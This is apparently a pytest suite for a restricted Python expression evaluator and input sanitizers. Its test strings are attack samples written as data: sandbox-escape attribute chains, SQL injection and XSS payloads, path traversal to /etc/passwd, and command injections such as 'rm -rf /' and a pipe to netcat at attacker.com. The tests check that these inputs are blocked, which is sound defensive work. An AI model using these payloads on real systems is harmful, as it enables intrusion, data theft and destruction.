"""
Comprehensive Security Test Suite
Tests for safe_eval.py and input_validation.py exploits and edge cases

Run with: pytest test_security_comprehensive.py -v
"""

import pytest
from safe_eval_fixed import (
    safe_eval, SafeEvalError, EvaluationTimeout,
    apply_transformation_logic, evaluate_condition
)
from input_validation_fixed import (
    sanitize_string, sanitize_dict, sanitize_log_message,
    sanitize_dynamodb_key, sanitize_filter_expression,
    validate_product_data, sanitize_iso_datetime
)


# ==================== SAFE_EVAL EXPLOIT TESTS ====================

class TestSafeEvalExploits:
    """Test that safe_eval blocks known exploits"""
    
    def test_attribute_access_blocked(self):
        """Block access to __class__, __globals__, etc."""
        with pytest.raises(SafeEvalError, match="Attribute access not allowed"):
            safe_eval("value.__class__", {"value": ""})
    
    def test_class_hierarchy_exploit_blocked(self):
        """Block attempts to access class hierarchy"""
        with pytest.raises(SafeEvalError, match="Attribute access not allowed"):
            safe_eval("value.__class__.__bases__", {"value": ""})
    
    def test_globals_access_blocked(self):
        """Block attempts to access globals"""
        with pytest.raises(SafeEvalError, match="Attribute access not allowed"):
            safe_eval("value.__globals__", {"value": lambda: None})
    
    def test_subscript_access_blocked(self):
        """Block subscript access (prevents __getitem__ exploits)"""
        with pytest.raises(SafeEvalError, match="Subscript access not allowed"):
            safe_eval("value[0]", {"value": [1, 2, 3]})
    
    def test_list_comprehension_blocked(self):
        """Block list comprehensions"""
        with pytest.raises(SafeEvalError, match="Comprehensions not allowed"):
            safe_eval("[x for x in range(10)]", {})
    
    def test_lambda_blocked(self):
        """Block lambda functions"""
        with pytest.raises(SafeEvalError, match="Lambda functions not allowed"):
            safe_eval("(lambda x: x + 1)(5)", {})
    
    def test_dangerous_function_str_removed(self):
        """str() function removed (could call malicious __str__)"""
        with pytest.raises(SafeEvalError, match="Unsafe function"):
            safe_eval("str(value)", {"value": 123})
    
    def test_dangerous_function_int_removed(self):
        """int() function removed (DoS possible)"""
        with pytest.raises(SafeEvalError, match="Unsafe function"):
            safe_eval("int(value)", {"value": "123"})
    
    def test_dangerous_function_float_removed(self):
        """float() function removed (DoS possible)"""
        with pytest.raises(SafeEvalError, match="Unsafe function"):
            safe_eval("float(value)", {"value": "123.45"})
    
    def test_dangerous_function_min_removed(self):
        """min() function removed (bypasseable)"""
        with pytest.raises(SafeEvalError, match="Unsafe function"):
            safe_eval("min(1, 2, 3)", {})
    
    def test_dangerous_function_max_removed(self):
        """max() function removed (bypasseable)"""
        with pytest.raises(SafeEvalError, match="Unsafe function"):
            safe_eval("max(1, 2, 3)", {})


class TestSafeEvalDepthLimits:
    """Test recursion depth limits"""
    
    def test_deep_nesting_blocked(self):
        """Very deeply nested expressions blocked"""
        # Create expression with 100 levels of nesting
        expression = "value" + " + 1" * 100
        with pytest.raises(SafeEvalError, match="too complex|too deep"):
            safe_eval(expression, {"value": 0})
    
    def test_complex_ast_blocked(self):
        """Overly complex AST blocked"""
        # Create very complex expression
        expression = " + ".join(str(i) for i in range(200))
        with pytest.raises(SafeEvalError, match="too complex"):
            safe_eval(expression, {})


class TestSafeEvalDoSPrevention:
    """Test DoS attack prevention"""
    
    def test_power_operation_limits(self):
        """Large power operations blocked"""
        with pytest.raises(SafeEvalError, match="too large|overflow"):
            safe_eval("10 ** 1000", {})
    
    def test_power_operation_base_limit(self):
        """Large base in power operation blocked"""
        with pytest.raises(SafeEvalError, match="too large"):
            safe_eval("10000 ** 10", {})
    
    def test_division_by_zero_blocked(self):
        """Division by zero properly handled"""
        with pytest.raises(SafeEvalError, match="Division by zero"):
            safe_eval("10 / 0", {})
    
    def test_expression_length_limit(self):
        """Very long expressions blocked"""
        expression = "1" * 2000
        with pytest.raises(SafeEvalError, match="too long"):
            safe_eval(expression, {})
    
    def test_string_constant_length_limit(self):
        """Very long string constants blocked"""
        long_string = "x" * 2000
        with pytest.raises(SafeEvalError, match="String constant too long"):
            safe_eval(f"'{long_string}'", {})


class TestSafeEvalBooleanOperators:
    """Test boolean operators with short-circuit evaluation"""
    
    def test_and_short_circuit_prevents_error(self):
        """AND short-circuits before division by zero"""
        # Should return False without evaluating 1/0
        result = safe_eval("False and (1 / 0)", {})
        assert result == False
    
    def test_or_short_circuit_prevents_error(self):
        """OR short-circuits before division by zero"""
        # Should return True without evaluating 1/0
        result = safe_eval("True or (1 / 0)", {})
        assert result == True
    
    def test_and_evaluates_all_when_true(self):
        """AND evaluates all operands when needed"""
        result = safe_eval("True and True and True", {})
        assert result == True
    
    def test_or_evaluates_all_when_false(self):
        """OR evaluates all operands when needed"""
        result = safe_eval("False or False or False", {})
        assert result == False


class TestSafeEvalValidOperations:
    """Test that valid operations still work"""
    
    def test_arithmetic_operations(self):
        """Basic arithmetic works"""
        assert safe_eval("10 + 5", {}) == 15
        assert safe_eval("10 - 5", {}) == 5
        assert safe_eval("10 * 5", {}) == 50
        assert safe_eval("10 / 5", {}) == 2
    
    def test_comparison_operations(self):
        """Comparisons work"""
        assert safe_eval("10 > 5", {}) == True
        assert safe_eval("10 < 5", {}) == False
        assert safe_eval("10 == 10", {}) == True
    
    def test_safe_functions(self):
        """Safe functions work"""
        assert safe_eval("upper('hello')", {}) == "HELLO"
        assert safe_eval("lower('HELLO')", {}) == "hello"
        assert safe_eval("len('hello')", {}) == 5
        assert safe_eval("abs(-10)", {}) == 10
    
    def test_function_with_length_limit(self):
        """Functions apply length limits"""
        # upper() should limit to 1000 chars
        long_string = "x" * 500
        result = safe_eval(f"upper('{long_string}')", {})
        assert len(result) == 500


# ==================== INPUT VALIDATION EXPLOIT TESTS ====================

class TestSQLInjectionExploits:
    """Test SQL injection pattern detection"""
    
    def test_basic_select_blocked(self):
        """Basic SELECT statement blocked"""
        with pytest.raises(ValueError, match="SQL injection"):
            sanitize_string("SELECT * FROM users")
    
    def test_sql_with_comments_blocked(self):
        """SQL with comments blocked"""
        with pytest.raises(ValueError, match="SQL injection"):
            sanitize_string("SEL/**/ECT * FROM users")
    
    def test_sql_with_double_dash_blocked(self):
        """SQL with -- comments blocked"""
        with pytest.raises(ValueError, match="SQL injection"):
            sanitize_string("admin' --")
    
    def test_sql_union_variations_blocked(self):
        """Various UNION spellings blocked"""
        variations = [
            "UNION SELECT",
            "UN ION SELECT",
            "UN/**/ION SELECT",
        ]
        for variant in variations:
            with pytest.raises(ValueError, match="SQL injection"):
                sanitize_string(variant)
    
    def test_sql_or_equals_blocked(self):
        """OR with equals blocked"""
        with pytest.raises(ValueError, match="SQL injection"):
            sanitize_string("' OR '1'='1")
    
    def test_sql_semicolon_blocked(self):
        """Semicolon (command separator) blocked"""
        with pytest.raises(ValueError, match="SQL injection"):
            sanitize_string("admin'; DROP TABLE users;--")
    
    def test_hex_encoding_blocked(self):
        """Hex encoding attempts blocked"""
        with pytest.raises(ValueError, match="SQL injection"):
            sanitize_string("0x53454C454354")  # "SELECT" in hex


class TestXSSExploits:
    """Test XSS pattern detection"""
    
    def test_script_tag_blocked(self):
        """<script> tag blocked"""
        with pytest.raises(ValueError, match="XSS"):
            sanitize_string("<script>alert(1)</script>")
    
    def test_script_tag_variations_blocked(self):
        """Various <script> tag formats blocked"""
        variations = [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "< script >alert(1)< /script >",
            "<script  >alert(1)</script>",
        ]
        for variant in variations:
            with pytest.raises(ValueError, match="XSS"):
                sanitize_string(variant)
    
    def test_javascript_protocol_blocked(self):
        """javascript: protocol blocked"""
        with pytest.raises(ValueError, match="XSS"):
            sanitize_string("javascript:alert(1)")
    
    def test_event_handlers_blocked(self):
        """Event handlers blocked"""
        handlers = [
            "onerror=alert(1)",
            "onload=alert(1)",
            "onclick=alert(1)",
            "onmouseover=alert(1)",
            "onfocus=alert(1)",
            "oninput=alert(1)",
        ]
        for handler in handlers:
            with pytest.raises(ValueError, match="XSS"):
                sanitize_string(f"<img {handler}>")
    
    def test_eval_blocked(self):
        """eval() attempts blocked"""
        with pytest.raises(ValueError, match="XSS"):
            sanitize_string("eval(alert(1))")
    
    def test_svg_xss_blocked(self):
        """SVG-based XSS blocked"""
        with pytest.raises(ValueError, match="XSS"):
            sanitize_string("<svg onload=alert(1)>")
    
    def test_iframe_blocked(self):
        """<iframe> tag blocked"""
        with pytest.raises(ValueError, match="XSS"):
            sanitize_string("<iframe src='evil.com'></iframe>")
    
    def test_data_protocol_blocked(self):
        """data: protocol blocked"""
        with pytest.raises(ValueError, match="XSS"):
            sanitize_string("data:text/html,<script>alert(1)</script>")


class TestPathTraversalExploits:
    """Test path traversal pattern detection"""
    
    def test_basic_path_traversal_blocked(self):
        """Basic ../ blocked"""
        with pytest.raises(ValueError, match="path traversal"):
            sanitize_string("../../etc/passwd")
    
    def test_windows_path_traversal_blocked(self):
        """Windows-style ..\ blocked"""
        with pytest.raises(ValueError, match="path traversal"):
            sanitize_string("..\\..\\windows\\system32")
    
    def test_url_encoded_traversal_blocked(self):
        """URL-encoded path traversal blocked"""
        with pytest.raises(ValueError, match="path traversal"):
            sanitize_string("..%2f..%2fetc%2fpasswd")


class TestCommandInjectionExploits:
    """Test command injection pattern detection"""
    
    def test_semicolon_blocked(self):
        """Semicolon command separator blocked"""
        with pytest.raises(ValueError, match="command injection"):
            sanitize_string("ls; rm -rf /")
    
    def test_pipe_blocked(self):
        """Pipe character blocked"""
        with pytest.raises(ValueError, match="command injection"):
            sanitize_string("cat file | nc attacker.com 1234")
    
    def test_backtick_blocked(self):
        """Backtick command substitution blocked"""
        with pytest.raises(ValueError, match="command injection"):
            sanitize_string("`whoami`")
    
    def test_dollar_parenthesis_blocked(self):
        """$() command substitution blocked"""
        with pytest.raises(ValueError, match="command injection"):
            sanitize_string("$(whoami)")


class TestNoSQLInjectionExploits:
    """Test NoSQL injection pattern detection"""
    
    def test_mongodb_operator_blocked(self):
        """MongoDB operators blocked in keys"""
        with pytest.raises(ValueError, match="injection pattern"):
            sanitize_dynamodb_key("$where")
    
    def test_json_object_blocked(self):
        """JSON objects blocked in keys"""
        with pytest.raises(ValueError, match="injection pattern"):
            sanitize_dynamodb_key('{"$ne": null}')


class TestInputValidationEdgeCases:
    """Test edge cases in input validation"""
    
    def test_empty_string_after_sanitization(self):
        """Empty string after sanitization rejected"""
        with pytest.raises(ValueError, match="empty after sanitization"):
            sanitize_dynamodb_key("!@#$%")
    
    def test_very_long_string_rejected(self):
        """Very long strings rejected"""
        long_string = "x" * 2000
        with pytest.raises(ValueError, match="exceeds maximum length"):
            sanitize_string(long_string)
    
    def test_null_bytes_removed(self):
        """Null bytes removed from strings"""
        result = sanitize_string("hello\x00world")
        assert "\x00" not in result
    
    def test_control_characters_in_logs(self):
        """Control characters removed from log messages"""
        result = sanitize_log_message("hello\r\nworld\ttab")
        assert "\r" not in result
        assert "\n" not in result
        assert "\t" not in result
    
    def test_ansi_escape_sequences_removed(self):
        """ANSI escape sequences removed from logs"""
        result = sanitize_log_message("hello\x1b[31mred\x1b[0m")
        assert "\x1b" not in result


class TestRecursionDepthLimits:
    """Test recursion depth limits in dict sanitization"""
    
    def test_deeply_nested_dict_blocked(self):
        """Deeply nested dictionaries blocked"""
        # Create dict nested 30 levels deep
        nested = {"key": "value"}
        for _ in range(30):
            nested = {"nested": nested}
        
        with pytest.raises(ValueError, match="exceeds maximum depth"):
            sanitize_dict(nested)
    
    def test_reasonable_nesting_allowed(self):
        """Reasonable nesting (5 levels) allowed"""
        nested = {"key": "value"}
        for _ in range(5):
            nested = {"nested": nested}
        
        result = sanitize_dict(nested)
        assert result is not None


class TestProductValidation:
    """Test product data validation"""
    
    def test_valid_product_accepted(self):
        """Valid product passes validation"""
        product = {
            "id": "123",
            "name": "Test Product",
            "ean": "1234567890123"
        }
        result = validate_product_data(product)
        assert result["id"] == "123"
        assert result["name"] == "Test Product"
    
    def test_missing_required_field_rejected(self):
        """Product missing required fields rejected"""
        product = {"name": "Test Product"}
        with pytest.raises(ValueError, match="Missing required field"):
            validate_product_data(product)
    
    def test_invalid_ean_removed(self):
        """Invalid EAN format removed (not rejected)"""
        product = {
            "id": "123",
            "name": "Test Product",
            "ean": "invalid"
        }
        result = validate_product_data(product)
        assert "ean" not in result
    
    def test_product_with_sql_injection_rejected(self):
        """Product with SQL injection patterns rejected"""
        product = {
            "id": "123",
            "name": "Test'; DROP TABLE products;--"
        }
        with pytest.raises(ValueError, match="SQL injection"):
            validate_product_data(product)


class TestDateTimeValidation:
    """Test datetime validation"""
    
    def test_valid_iso_datetime_accepted(self):
        """Valid ISO datetime accepted"""
        result = sanitize_iso_datetime("2024-01-15T10:30:00Z")
        assert result == "2024-01-15T10:30:00Z"
    
    def test_invalid_datetime_rejected(self):
        """Invalid datetime format rejected"""
        with pytest.raises(ValueError, match="Invalid datetime format"):
            sanitize_iso_datetime("not-a-date")
    
    def test_datetime_with_injection_rejected(self):
        """Datetime with injection patterns rejected"""
        with pytest.raises(ValueError):
            sanitize_iso_datetime("2024-01-15'; DROP TABLE--")


class TestFilterExpressionValidation:
    """Test filter expression validation"""
    
    def test_valid_filter_accepted(self):
        """Valid filter expression accepted"""
        result = sanitize_filter_expression("date>=2024-01-01")
        assert result == "date>=2024-01-01"
    
    def test_complex_filter_accepted(self):
        """Complex filter with AND/OR accepted"""
        result = sanitize_filter_expression("date>=2024-01-01 AND status=active")
        assert "AND" in result
    
    def test_filter_with_sql_injection_rejected(self):
        """Filter with SQL injection rejected"""
        with pytest.raises(ValueError, match="injection pattern"):
            sanitize_filter_expression("date>=2024-01-01 OR 1=1--")
    
    def test_invalid_field_name_rejected(self):
        """Filter with invalid field name rejected"""
        with pytest.raises(ValueError, match="Invalid filter expression"):
            sanitize_filter_expression("'; DROP-->=2024-01-01")


# ==================== INTEGRATION TESTS ====================

class TestSafeEvalIntegration:
    """Integration tests for safe_eval"""
    
    def test_transformation_logic_fallback(self):
        """Transformation returns original on error"""
        result = apply_transformation_logic(100, "value.__class__")
        assert result == 100  # Original value returned
    
    def test_condition_evaluation_fallback(self):
        """Condition returns False on error"""
        result = evaluate_condition(100, "value.__class__")
        assert result == False


class TestInputValidationIntegration:
    """Integration tests for input validation"""
    
    def test_sanitize_dict_with_mixed_content(self):
        """Dict with mixed valid/invalid content"""
        data = {
            "valid_key": "valid_value",
            "sql_key": "SELECT * FROM users",  # Should be skipped
            "number": 123,
            "nested": {
                "inner": "value"
            }
        }
        result = sanitize_dict(data)
        assert "valid_key" in result
        assert "sql_key" not in result  # Skipped due to SQL injection
        assert "number" in result
        assert "nested" in result


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
